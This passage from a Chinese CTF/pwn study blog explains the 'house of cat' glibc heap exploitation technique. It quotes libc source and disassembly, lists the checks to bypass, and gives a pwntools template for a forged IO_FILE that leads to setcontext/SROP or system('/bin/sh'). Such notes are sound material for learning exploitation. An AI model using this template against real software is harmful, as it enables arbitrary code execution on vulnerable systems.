<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中_IO_wfile_seekoff函数代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
<p>对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
<p>主要关注这几句，做了一下几点事情</p>
<ol>
<li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p>
</li>
<li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p>
</li>
<li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li>
<li>call调用[rax2+0x18]处的内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34` `&lt;_IO_switch_to_wget_mode``+``4``&gt;   mov  rax, qword ptr [rdi ``+` `0xa0``]</span><br><span class="line">0x7f4cae745d3f` `&lt;_IO_switch_to_wget_mode``+``15``&gt;  mov  rdx, qword ptr [rax ``+` `0x20``]</span><br><span class="line">0x7f4cae745d49` `&lt;_IO_switch_to_wget_mode``+``25``&gt;  mov  rax, qword ptr [rax ``+` `0xe0``]</span><br><span class="line">0x7f4cae745d55` `&lt;_IO_switch_to_wget_mode``+``37``&gt;  call  qword ptr [rax ``+` `0x18``]</span><br></pre></td></tr></table></figure>
<p>而rdi此时的状态:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p>
<p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p>
<p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p>
<p>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</p>
<p>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</p>
<h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p>
<h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p>
<p>需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>how2heap</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/49295/">https://ixout.github.io/posts/49295/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-08-19</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2023-11-20</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/how2heap/">how2heap</a><a class="post-meta__tags" href="/tags/heap/">heap</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/14246/" title="calloc函数学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">calloc函数学习</div></div></a></div><div class="next-post pull-right"><a href="/posts/65020/" title="汇编小记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">汇编小记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="iconfont icon-github1"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">38</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">46</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">4</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">1.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">2.29新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">2.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B1"><span class="toc-number">2.2.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">2.2.2.</span> <span class="toc-text">示例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2.31新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.4.</span> <span class="toc-text">例题1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982"><span class="toc-number">2.5.</span> <span class="toc-text">例题2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-lore"><span class="toc-number">3.</span> <span class="toc-text">house of lore</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-2"><span class="toc-number">3.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">4.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-3"><span class="toc-number">4.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">4.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">4.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">5.</span> <span class="toc-text">house of rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-4"><span class="toc-number">5.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">5.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">5.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-roman"><span class="toc-number">6.</span> <span class="toc-text">house of roman</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-5"><span class="toc-number">6.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">6.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-pig"><span class="toc-number">7.</span> <span class="toc-text">house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-6"><span class="toc-number">7.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="toc-number">7.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">8.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-7"><span class="toc-number">8.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-7"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">8.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">9.</span> <span class="toc-text">house of kiwi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-8"><span class="toc-number">9.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-8"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc-assert"><span class="toc-number">9.2.0.1.</span> <span class="toc-text">__malloc_assert</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">9.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-storm"><span class="toc-number">10.</span> <span class="toc-text">house of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-9"><span class="toc-number">10.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-9"><span class="toc-number">10.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">10.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-banana"><span class="toc-number">11.</span> <span class="toc-text">house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-10"><span class="toc-number">11.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-10"><span class="toc-number">11.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">11.3.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1-poc"><span class="toc-number">11.3.1.</span> <span class="toc-text">思路1-poc:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2-poc"><span class="toc-number">11.3.2.</span> <span class="toc-text">思路2-poc:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-4"><span class="toc-number">11.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-emma"><span class="toc-number">12.</span> <span class="toc-text">house of emma</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-11"><span class="toc-number">12.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-11"><span class="toc-number">12.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E5%8F%AF%E8%83%BD%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">12.2.1.</span> <span class="toc-text">实操可能的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-5"><span class="toc-number">12.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat"><span class="toc-number">13.</span> <span class="toc-text">house of cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">13.0.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-12"><span class="toc-number">13.0.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE%E7%BB%93%E6%9E%84%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">13.0.2.1.</span> <span class="toc-text">IO_FILE结构及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable%E6%A3%80%E6%9F%A5"><span class="toc-number">13.0.2.2.</span> <span class="toc-text">vtable检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 